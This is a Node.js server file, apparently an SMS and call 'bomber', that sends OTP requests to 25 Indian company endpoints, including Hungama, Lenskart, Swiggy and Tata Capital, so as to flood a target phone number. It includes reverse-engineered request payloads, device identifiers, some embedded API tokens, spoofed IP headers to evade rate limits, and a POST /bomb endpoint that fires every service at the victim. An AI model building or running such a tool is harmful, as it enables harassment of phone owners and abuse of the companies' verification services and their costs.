// ============================================================
// api_server.js - OTP API Server with Health Logging (25 APIs)
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// ===== CONFIG =====
// ============================================================

const BATCH_DELAY = 10;
const API_TIMEOUT = 5000;

// ============================================================
// ===== IP GENERATOR =====
// ============================================================

function randomIndianIP() {
    const prefixes = ['49.', '103.', '106.', '117.', '122.', '182.', '183.', '202.', '203.'];
    const p = prefixes[Math.floor(Math.random() * prefixes.length)];
    return p + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
}

// ============================================================
// ===== API CONFIGS (25 APIs) =====
// ============================================================

const API_CONFIGS = [
    // ==================== SMS APIs ====================
    {
        name: "Hungama",
        endpoint: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        type: "sms",
        payload: {
            "mobileNo": "{{PHONE}}", "countryCode": "+91", "appCode": "un",
            "messageId": "1", "emailId": "", "subject": "Register",
            "priority": "1", "device": "web", "variant": "v1", "templateCode": 1
        },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home", "mlang": "en", "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        }
    },
    {
        name: "MeruCab",
        endpoint: "https://merucabapp.com/api/otp/generate",
        method: "POST",
        type: "sms",
        raw: true,
        payload: { "mobile_number": "{{PHONE}}" },
        headers: {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "AppVersion": "245", "ApiVersion": "6.2.55", "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0"
        }
    },
    {
        name: "Dayco",
        endpoint: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        method: "POST",
        type: "sms",
        raw: true,
        payload: { "api": "send_otp", "brand": "dayco", "mob": "{{PHONE}}", "resend_otp": "resend_otp" },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ekyc.daycoindia.com",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php"
        }
    },
    {
        name: "Doubtnut",
        endpoint: "https://api.doubtnut.com/v4/student/login",
        method: "POST",
        type: "sms",
        payload: {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "course": "",
            "phone_number": "{{PHONE}}",
            "language": "en",
            "udid": "b751fb63c0ae17ba",
            "class": "",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
        },
        headers: {
            "version_code": "1160", "has_upi": "false",
            "device_model": "ASUS_I005DA", "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip", "user-agent": "okhttp/5.0.0-alpha.2"
        }
    },
    {
        name: "NoBroker",
        endpoint: "https://www.nobroker.in/api/v3/account/otp/send",
        method: "POST",
        type: "sms",
        raw: true,
        payload: { "phone": "{{PHONE}}", "countryCode": "IN" },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        }
    },
    {
        name: "Shiprocket",
        endpoint: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        method: "POST",
        type: "sms",
        payload: { "mobileNumber": "{{PHONE}}" },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://app.shiprocket.in",
            "referer": "https://app.shiprocket.in/"
        }
    },
    {
        name: "PenPencil",
        endpoint: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        method: "POST",
        type: "sms",
        payload: { "organizationId": "5eb393ee95fab7468a79d189", "mobile": "{{PHONE}}" },
        headers: {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        name: "KPNFresh",
        endpoint: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        method: "POST",
        type: "sms",
        payload: { "phone_number": { "number": "{{PHONE}}", "country_code": "+91" } },
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "content-type": "application/json",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        }
    },
    {
        name: "Servetel",
        endpoint: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        type: "sms",
        raw: true,
        payload: { "mobile_number": "{{PHONE}}" },
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"
        }
    },
    {
        name: "Lenskart",
        endpoint: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        method: "POST",
        type: "sms",
        payload: { "captcha": null, "phoneCode": "+91", "telephone": "{{PHONE}}" },
        headers: {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
            "Origin": "https://www.lenskart.com",
            "Referer": "https://www.lenskart.com/"
        }
    },
    {
        name: "BikeFixup",
        endpoint: "https://api.bikefixup.com/api/v2/send-registration-otp",
        method: "POST",
        type: "sms",
        payload: { "phone": "{{PHONE}}", "app_signature": "4pFtQJwcz6y" },
        headers: {
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)"
        }
    },
    {
        name: "Stratzy",
        endpoint: "https://stratzy.in/api/web/auth/sendPhoneOTP",
        method: "POST",
        type: "sms",
        payload: { "phoneNo": "{{PHONE}}" },
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login"
        }
    },
    {
        name: "WellAcademy",
        endpoint: "https://wellacademy.in/store/api/numberLoginV2",
        method: "POST",
        type: "sms",
        payload: { "contact_no": "{{PHONE}}" },
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://wellacademy.in"
        }
    },
    {
        name: "BeepKart",
        endpoint: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        method: "POST",
        type: "sms",
        payload: { "city": 362, "fullName": "", "phone": "{{PHONE}}", "source": "myaccount" },
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "origin": "https://www.beepkart.com",
            "referer": "https://www.beepkart.com/"
        }
    },
    {
        name: "LendingPlate",
        endpoint: "https://lendingplate.com/api.php",
        method: "POST",
        type: "sms",
        raw: true,
        payload: { "mobiles": "{{PHONE}}", "resend": "Resend", "clickcount": "3" },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://lendingplate.com",
            "Referer": "https://lendingplate.com/personal-loan"
        }
    },
    {
        name: "Snitch",
        endpoint: "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        method: "POST",
        type: "sms",
        payload: { "mobile_number": "+91{{PHONE}}" },
        headers: {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com",
            "Referer": "https://www.snitch.com/"
        }
    },
    {
        name: "Foxy",
        endpoint: "https://www.foxy.in/api/v2/users/send_otp",
        method: "POST",
        type: "sms",
        payload: { "user": { "phone_number": "+91{{PHONE}}" }, "device": null },
        headers: {
            "Content-Type": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "Referer": "https://www.foxy.in/onboarding",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        }
    },
    {
        name: "Wakefit",
        endpoint: "https://api.wakefit.co/api/consumer-sms-otp/",
        method: "POST",
        type: "sms",
        payload: { "mobile": "{{PHONE}}", "whatsapp_opt_in": 1 },
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.wakefit.co",
            "Referer": "https://www.wakefit.co/",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        }
    },
    {
        name: "Univest",
        method: "GET",
        type: "sms",
        urlBuilder: (phone) => `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${phone}`,
        headers: { "User-Agent": "okhttp/3.9.1" }
    },
    {
        name: "Jockey",
        method: "GET",
        type: "sms",
        urlBuilder: (phone) => `https://www.jockey.in/apps/jotp/api/login/send-otp/+91${phone}?whatsapp=false`,
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "*/*",
            "Referer": "https://www.jockey.in/"
        }
    },
    {
        name: "EkaCare",
        endpoint: "https://auth.eka.care/auth/init",
        method: "POST",
        type: "sms",
        payload: { "payload": { "allowWhatsapp": true, "mobile": "+91{{PHONE}}" }, "type": "mobile" },
        headers: {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3"
        }
    },
    {
        name: "Smytten",
        endpoint: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST",
        type: "sms",
        payload: { "device_platform": "web", "phone": "{{PHONE}}" },
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://smytten.com",
            "Referer": "https://smytten.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        }
    },

    // ==================== VOICE CALL APIs ====================
    {
        name: "TataCapital (Voice)",
        endpoint: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        type: "call",
        payload: { "phone": "{{PHONE}}", "applSource": "", "isOtpViaCallAtLogin": "true" },
        headers: { "Content-Type": "application/json" }
    },
    {
        name: "1MG (Voice)",
        endpoint: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        type: "call",
        payload: { "number": "{{PHONE}}", "is_corporate_user": false, "otp_on_call": true },
        headers: {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        name: "Swiggy (Voice)",
        endpoint: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        type: "call",
        payload: { "mobile": "{{PHONE}}" },
        headers: {
            "user-agent": "Swiggy-Android",
            "content-type": "application/json; charset=utf-8"
        }
    }
];

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 300;

API_CONFIGS.forEach(api => {
    stats[api.name] = {
        name: api.name,
        type: api.type,
        total: 0,
        success: 0,
        failed: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, success, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (success) { s.success++; s.lastStatus = 'WORKING'; }
    else { s.failed++; s.lastStatus = 'FAILED'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0
        ? responseTime
        : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== HELPERS =====
// ============================================================

function replacePlaceholders(obj, phone) {
    if (typeof obj === 'string') return obj.replace(/\{\{PHONE\}\}/g, phone);
    if (Array.isArray(obj)) return obj.map(item => replacePlaceholders(item, phone));
    if (typeof obj === 'object' && obj !== null) {
        const out = {};
        for (const key in obj) out[key] = replacePlaceholders(obj[key], phone);
        return out;
    }
    return obj;
}

function buildFormData(obj) {
    const parts = [];
    for (const key in obj) {
        const val = obj[key];
        if (val === null || val === undefined) continue;
        parts.push(encodeURIComponent(key) + '=' + encodeURIComponent(val));
    }
    return parts.join('&');
}

// ============================================================
// ===== API CALL =====
// ============================================================

async function callAPI(api, phone) {
    const startTime = Date.now();
    const ip = randomIndianIP();

    try {
        // Build URL (dynamic or static)
        const url = api.urlBuilder ? api.urlBuilder(phone) : api.endpoint;

        // Build headers
        const headers = { ...(api.headers || {}) };
        for (const key in headers) {
            if (typeof headers[key] === 'string') {
                headers[key] = headers[key].replace(/\{\{PHONE\}\}/g, phone);
            }
        }
        headers['X-Forwarded-For'] = ip;
        headers['Client-IP'] = ip;

        // Build payload
        let data;
        const contentType = (headers['Content-Type'] || headers['content-type'] || '').toLowerCase();

        if (api.method === 'GET') {
            data = undefined;
        } else if (api.raw || contentType.includes('x-www-form-urlencoded')) {
            const replaced = replacePlaceholders(api.payload, phone);
            data = buildFormData(replaced);
        } else {
            data = JSON.stringify(replacePlaceholders(api.payload, phone));
        }

        const config = {
            method: api.method,
            url,
            headers,
            timeout: API_TIMEOUT,
            validateStatus: () => true
        };
        if (data !== undefined) config.data = data;

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const isAlive = response.status < 500;

        if (isAlive) {
            recordResult(api.name, true, response.status, responseTime);
            if (response.status >= 200 && response.status < 300) {
                logEvent(`${api.name} → ${response.status} (${responseTime}ms) ✅`, 'success');
            } else {
                logEvent(`${api.name} → ${response.status} (${responseTime}ms) [alive]`, 'warn');
            }
            return { success: true, status: response.status, responseTime };
        } else {
            recordResult(api.name, false, response.status, responseTime, `HTTP ${response.status}`);
            logEvent(`${api.name} → ${response.status} (${responseTime}ms) ❌`, 'error');
            return { success: false, status: response.status, responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';
        recordResult(api.name, false, null, responseTime, errMsg);
        logEvent(`${api.name} → FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { success: false, status: null, responseTime, error: errMsg };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api-server',
        totalAPIs: API_CONFIGS.length,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: API_CONFIGS.length });
});

// Test ALL APIs
app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');

    const results = [];
    for (const api of API_CONFIGS) {
        const r = await callAPI(api, phone);
        results.push({ name: api.name, type: api.type, ...r });
        await new Promise(r => setTimeout(r, 300));
    }

    const working = results.filter(r => r.success).length;
    const failed = results.length - working;
    logEvent(`🧪 Test complete: ${working}/${results.length} working`, working > 0 ? 'success' : 'error');

    res.json({ phone, total: results.length, working, failed, results });
});

// Test single API
app.get('/test-one', async (req, res) => {
    const apiName = req.query.name;
    const phone = req.query.phone || '9999999999';
    const api = API_CONFIGS.find(a => a.name.toLowerCase() === (apiName || '').toLowerCase());
    if (!api) return res.status(404).json({ error: 'API not found. Use /apis to list.' });
    const r = await callAPI(api, phone);
    res.json({ name: api.name, ...r });
});

// List all APIs
app.get('/apis', (req, res) => {
    res.json({
        total: API_CONFIGS.length,
        apis: API_CONFIGS.map(a => ({
            name: a.name,
            type: a.type,
            method: a.method,
            endpoint: a.endpoint || '(dynamic)'
        }))
    });
});

// Stats
app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => ({
        name: s.name,
        type: s.type,
        total: s.total,
        success: s.success,
        failed: s.failed,
        successRate: s.total > 0 ? ((s.success / s.total) * 100).toFixed(1) + '%' : 'N/A',
        status: s.lastStatus || 'NEVER TESTED',
        lastStatusCode: s.lastStatusCode,
        lastTime: s.lastTime,
        lastError: s.lastError,
        avgResponseTime: s.avgResponseTime + 'ms'
    }));

    const workingCount = arr.filter(a => a.status === 'WORKING').length;
    const failedCount = arr.filter(a => a.status === 'FAILED').length;
    const untestedCount = arr.filter(a => a.status === 'NEVER TESTED').length;

    res.json({
        summary: { total: arr.length, working: workingCount, failed: failedCount, untested: untestedCount },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-50).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = {
            name: stats[key].name, type: stats[key].type,
            total: 0, success: 0, failed: 0,
            lastStatus: null, lastStatusCode: null,
            lastTime: null, lastError: null, avgResponseTime: 0
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true, message: 'Stats reset' });
});

// Bomb endpoint
app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    logEvent(`📱 BOMB | phone=${phone} | duration=${duration || 'default'} | instance=${instance || 'default'}`, 'info');

    try {
        const startTime = Date.now();
        const shuffled = [...API_CONFIGS];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let success = 0, smsCount = 0, callCount = 0;
        const results = [];

        for (const api of shuffled) {
            const r = await callAPI(api, phone);
            if (r.success) {
                success++;
                if (api.type === 'call') callCount++;
                else smsCount++;
            }
            results.push({ name: api.name, ...r });
            await new Promise(r => setTimeout(r, BATCH_DELAY));
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        logEvent(`📱 DONE | ${phone} | sent=${success} | sms=${smsCount} | calls=${callCount} | ${elapsed}s`, success > 0 ? 'success' : 'error');

        res.json({
            success: true, phone, duration: duration || 'default',
            instance: instance || 'default',
            totalSent: success, sms: smsCount, calls: callCount, whatsapp: 0,
            elapsed: elapsed + 's', details: results
        });
    } catch (error) {
        logEvent(`📱 BOMB ERROR | ${phone} | ${error.message}`, 'error');
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// ===== START SERVER =====
// ============================================================

const PORT = process.env.PORT || 10000;

app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server Started on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 APIs Loaded: ${API_CONFIGS.length}`);
    console.log('═══════════════════════════════════════════');
    console.log('📋 Endpoints:');
    console.log('   GET  /              - Server status');
    console.log('   GET  /health        - Health check');
    console.log('   GET  /apis          - List all APIs');
    console.log('   GET  /test?phone=X  - Test ALL APIs');
    console.log('   GET  /test-one?name=X&phone=Y - Test single');
    console.log('   GET  /stats         - Working/Failed summary');
    console.log('   GET  /logs          - Recent logs');
    console.log('   GET  /reset-stats   - Reset stats');
    console.log('   POST /bomb          - Trigger bombing');
    console.log('═══════════════════════════════════════════');
    API_CONFIGS.forEach((api, i) => {
        console.log(`   ${i + 1}. [${api.type.toUpperCase()}] ${api.name}`);
    });
    console.log('═══════════════════════════════════════════');
});
